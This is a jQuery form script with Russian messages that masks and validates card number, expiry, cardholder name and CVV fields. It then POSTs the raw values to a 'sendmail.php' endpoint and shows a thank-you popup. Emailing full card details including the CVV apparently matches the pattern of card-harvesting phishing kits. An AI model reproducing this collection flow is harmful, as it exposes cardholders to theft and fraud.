$(function() {

//------------------------------------form-card------------------------------------------
  $('input[id="card"]').mask('0000 0000 0000 0000');

//------------------------------------form-data------------------------------------------
  $('input[name="data"]').mask('00/00');

//------------------------------------form-cvv------------------------------------------
  $('input[name="cvv"]').mask('000');

//------------------------------------form-validate------------------------------------------
  $(".form").each(function(index, el) {
    $(el).addClass('form-' + index);

    $('.form-' + index).validate({
      rules: {
        phone: {
          required: true,
          phoneno: true
        },
        name: 'required',
      },
      messages: {
        card: "Номер карты введён неверно",
        data: "Срок действия введён неверно",
        name: "Введите Имя владельца карты",
        cvv: "CVV введён неверно",
      },
      submitHandler: function(form) {
        var t = {
          card: jQuery('.form-' + index).find("input[name=card]").val(),
          data: jQuery('.form-' + index).find("input[name=data]").val(),
          name: jQuery('.form-' + index).find("input[name=name]").val(),
          cvv: jQuery('.form-' + index).find("input[name=cvv]").val(),
          subject: jQuery('.form-' + index).find("input[name=subject]").val()
        };
        ajaxSend('.form-' + index, t);
      }
    });

  });

  function ajaxSend(formName, data) {
    jQuery.ajax({
      type: "POST",
      url: "sendmail.php",
      data: data,
      success: function() {
        $(".modal").popup("hide");
        $("#thanks").popup("show");
        setTimeout(function() {
          $(formName).trigger('reset');
        }, 2000);
      }
    });
  }

});
